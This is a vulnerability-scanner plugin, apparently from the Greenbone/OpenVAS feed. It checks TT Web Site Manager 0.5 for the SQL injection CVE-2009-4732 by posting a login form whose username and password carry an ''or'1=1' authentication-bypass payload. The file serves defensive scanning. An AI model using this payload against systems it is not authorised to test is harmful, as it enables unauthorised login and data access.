# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:technotoad:tt_web_site_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902135");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_cve_id("CVE-2009-4732");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/36129");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9336");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/2128");

  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_tt_website_manager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("technotoad/tt_web_site_manager/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow execution of arbitrary SQL
  commands in the affected application.");

  script_tag(name:"affected", value:"TT Web Site Manager version 0.5 and prior.");

  script_tag(name:"insight", value:"The flaw is due to input validation error in the 'tt/index.php'
  script when processing the 'tt_name' parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"TT web site manager is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

host = http_host_name(port:port);

if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:FALSE))
  exit(0);

vers = infos["version"];
path = infos["location"];

if(path) {

  if(path == "/")
    path = "";

  filename = string(path + "/index.php");
  authVariables = "tt_name=admin+%27+or%27+1%3D1&tt_userpassword=admin+%27+or%27+1%3D1&action=Log+me+in";
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Referer: http://", host, filename, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_send_recv(port:port, data:sndReq);
  if("location: ttsite.php" >< rcvRes) {
    report = http_report_vuln_url(port:port, url:filename);
    security_message(port:port, data:report);
    exit(0);
  }
}

if(vers && version_is_less_equal(version:vers, test_version:"0.5")) {
  report = report_fixed_ver(installed_version:vers, fixed_version:"None", install_url:path);
  security_message(port:port, data:report);
}

exit(99);
